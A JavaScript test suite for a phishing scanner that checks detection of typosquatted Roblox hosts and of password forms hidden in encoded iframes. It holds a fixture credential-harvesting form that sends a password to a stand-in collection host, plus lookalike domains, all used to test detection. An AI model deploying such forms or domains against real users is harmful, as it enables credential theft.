import test from 'node:test';
import assert from 'node:assert/strict';
import {parsePage,scanSite} from './scanner.js';
import {inspectJobTarget} from './scan-jobs.js';
import {assessPage} from './page-assessment.js';
import {brandIdentitySignals} from '../shared/brand-identity.js';
const esc=s=>s.replaceAll('&','&amp;').replaceAll('"','&quot;').replaceAll('<','&lt;');
const embedded=html=>`<iframe srcdoc="${esc(html)}"></iframe>`;
const parse=html=>parsePage(Buffer.from(html),'https://store.example/');
const payload='<form action="https://other.example/collect?token=never-copy" method="get"><input type="password" value="never-copy"></form>';
test('single-edit, transposition, digit and official-domain boundaries',()=>{
 for(const host of ['poblox.com','rbolox.com','r0blox.com','roblox.com.evil.test'])assert(brandIdentitySignals('https://'+host).some(s=>s.evidence.includes('roblox')));
 for(const host of ['roblox.com','www.roblox.com','roblox.com.','steamship.example'])assert.equal(brandIdentitySignals('https://'+host).length,0);
});
test('secondary pass finds sensitive form destinations inside srcdoc and redacts field values',()=>{
 const result=parse(embedded(payload));assert.equal(result.analysisEngine.secondaryPass.documentsAnalyzed,1);assert.equal(result.analysisEngine.modules.length,20);
 assert(result.signals.some(s=>s.rule==='sensitive_form_external'&&s.documentScope==='embedded'));
 assert(result.signals.some(s=>s.rule==='sensitive_form_get'&&s.documentScope==='embedded'));assert(!JSON.stringify(result).includes('never-copy'));
 assert.equal(result.analysisEngine.modules.find(m=>m.id==='form-destinations').status,'finding');
});
test('base64 and URL-encoded embedded HTML are statically decoded and inspected',()=>{
 for(const data of ['data:text/html;base64,'+Buffer.from(payload).toString('base64'),'data:text/html,'+encodeURIComponent(payload)]){
 const result=parse(`<iframe src="${esc(data)}"></iframe>`);assert(result.signals.some(s=>s.rule==='sensitive_form_get'&&s.documentScope==='embedded'));assert.equal(result.analysisEngine.secondaryPass.javaScriptExecuted,false);}
});
test('depth, decoded-byte and document limits make coverage visibly incomplete',()=>{
 for(const html of [embedded(embedded(embedded(payload))),embedded('x'.repeat(128*1024+1)),Array.from({length:12},(_,i)=>embedded(`<p>${i}</p>`)).join(''),'<iframe src="data:text/html;base64,%%%"></iframe>']){
 const result=parse(html),summary=result.analysisEngine.secondaryPass;assert(summary.omittedDocuments>0);assert(summary.documentsAnalyzed<=8);assert(summary.decodedBytes<=128*1024);assert.notEqual(assessPage(result).status,'limited');assert(result.analysisEngine.modules.some(m=>m.coverage==='limited'));}
});
test('embedded script is never executed and duplicate documents are not rescanned',()=>{
 const html='<script>globalThis.__nestedExecuted=true</script>';const result=parse(embedded(html).repeat(3));assert.equal(result.analysisEngine.secondaryPass.documentsAnalyzed,1);assert.equal(globalThis.__nestedExecuted,undefined);
});
test('inherited parent base resolves relative embedded form actions without changing document origin',()=>{
 const html='<base href="https://other.example/forms/">'+embedded('<form action="submit" method="post"><input type="password"></form>');
 const result=parse(html);assert(result.signals.some(s=>s.rule==='sensitive_form_external'&&s.evidence.some(e=>e.includes('https://other.example/forms/submit'))));
});
test('brand spelling evidence survives unavailable content and redirect hops',async()=>{
 const result=await scanSite('https://poblox.com/',{validate:async()=>{},lookup:async()=>({status:'not_found'}),transport:async()=>{throw Object.assign(new Error('fixture unavailable'),{code:'ENOTFOUND'})}});
 assert.equal(result.status,'unavailable');assert(result.signals.some(s=>s.rule==='brand_typo_host'));
 assert(assessPage({redirects:[{from:'https://poblox.com/',to:'https://roblox.com/'}]}).signals.some(s=>s.rule==='brand_typo_host'));
});
test('primary and linked scans apply the same secondary findings and guarded browser path',async()=>{
 const url='https://store.example/',bytes=Buffer.from(embedded(payload)),events=[];let previewCalls=0;
 const options={validate:async()=>{},transport:async()=>({url,bytes,status:200,headers:{'content-type':'text/html'},redirects:[]})},lookup=async()=>({status:'not_found',message:'Synthetic fixture'});
 const root=await scanSite(url,{...options,lookup,allowCloudPreview:true,preview:async()=>{previewCalls++;return {status:'done'};},onEvent:e=>events.push(e.phase)});
 const child=await inspectJobTarget({id:'fixture',url,kind:'page'},{...options,urlLookup:lookup});
 assert(root.signals.some(s=>s.rule==='sensitive_form_get'&&s.documentScope==='embedded'));assert(child.findings.some(s=>s.rule==='sensitive_form_get'&&s.documentScope==='embedded'));assert.equal(root.status,child.status);assert.equal(previewCalls,1);assert(events.includes('secondary_analysis'));assert.equal(root.analysisEngine.version,'2.1.0');
});
